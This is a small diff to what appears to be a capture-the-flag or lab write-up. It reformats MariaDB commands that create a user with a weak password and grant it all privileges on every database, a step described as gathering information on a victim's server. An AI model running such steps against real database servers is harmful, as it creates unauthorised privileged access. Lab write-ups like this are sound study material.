@@ -331,12 +331,10 @@ sudo systemctl start mysql
 
 1. create user account and database owned by the user on the victim's database server to gather vulnerable information via execution of MySQL command
 ```bash
-MariaDB [(none)]> create user 'first'@'10.129.229.101' identified by 'password'
-    -> ;
+MariaDB [(none)]> create user 'first'@'10.129.229.101' identified by 'password';
 Query OK, 0 rows affected (0.001 sec)
 
-MariaDB [(none)]> grant all privileges on *.* to first@10.129.229.101
-    -> ;
+MariaDB [(none)]> grant all privileges on *.* to first@10.129.229.101;
 Query OK, 0 rows affected (0.001 sec)
 
 MariaDB [(none)]> flush privileges;
